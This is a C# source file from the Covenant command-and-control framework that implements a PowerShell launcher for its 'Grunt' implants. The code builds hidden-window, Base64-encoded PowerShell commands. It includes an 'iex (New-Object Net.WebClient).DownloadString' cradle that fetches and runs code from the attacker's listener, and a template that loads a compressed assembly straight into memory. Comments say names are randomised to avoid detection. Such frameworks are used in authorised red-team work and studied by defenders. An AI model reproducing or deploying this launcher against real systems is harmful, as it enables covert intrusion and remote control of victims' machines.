// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.Linq;
using Microsoft.CodeAnalysis;

using Covenant.Models.Grunts;
using Covenant.Models.Listeners;

namespace Covenant.Models.Launchers
{
    public class PowerShellLauncher : Launcher
    {
        public string ParameterString { get; set; } = "-Sta -Nop -Window Hidden";
        public string PowerShellCode { get; set; } = "";
        public string EncodedLauncherString { get; set; } = "";

        public PowerShellLauncher()
        {
            this.Type = LauncherType.PowerShell;
            this.Description = "Uses powershell.exe to launch a Grunt using [System.Reflection.Assembly]::Load()";
            this.Name = "PowerShell";
            this.OutputKind = OutputKind.WindowsApplication;
            this.CompressStager = true;
        }

        public PowerShellLauncher(String parameterString) : base()
        {
            this.ParameterString = parameterString;
        }

        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
        {
            this.StagerCode = StagerCode;
            this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);
            this.PowerShellCode = PowerShellLauncherCodeTemplate.Replace("{{GRUNT_IL_BYTE_STRING}}", this.Base64ILByteString);
            return GetLauncher(PowerShellCode);
        }

        private string GetLauncher(string code)
        {
            string launcher = "powershell " + this.ParameterString + " ";
            launcher += "-EncodedCommand ";
            // PowerShell EncodedCommand MUST be Unicode encoded, frustrating.
            launcher += Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(code));
            this.EncodedLauncherString = launcher;

            launcher = "powershell " + this.ParameterString + " ";
            launcher += "-Command \"" + code.Replace("\"", "\\\"\\\"") + "\"";
            this.LauncherString = launcher;

            return this.LauncherString;
        }

        public override string GetHostedLauncher(Listener listener, HostedFile hostedFile)
        {
            HttpListener httpListener = (HttpListener)listener;
            if (httpListener != null)
            {
                string firstUrl = httpListener.Urls.FirstOrDefault();
                if (string.IsNullOrEmpty(firstUrl))
                {
                    return "";
                }
                Uri hostedLocation = new Uri(firstUrl + hostedFile.Path);
                string code = "iex (New-Object Net.WebClient).DownloadString('" + hostedLocation + "')";
                this.LauncherString = GetLauncher(code);
                return this.LauncherString;
            }
            else { return ""; }
        }

        // Using randomized variable names to avoid detection patterns
        // Avoiding common signatures like sv/gv by using full cmdlet names with randomized aliases
        private static readonly string PowerShellLauncherCodeTemplate = @"$ms=New-Object IO.MemoryStream;$ds=New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('{{GRUNT_IL_BYTE_STRING}}'),[IO.Compression.CompressionMode]::Decompress);$bf=New-Object Byte[](1024);$rd=$ds.Read($bf,0,1024);while($rd -gt 0){$ms.Write($bf,0,$rd);$rd=$ds.Read($bf,0,1024);}[Reflection.Assembly]::Load($ms.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null";
    }
}
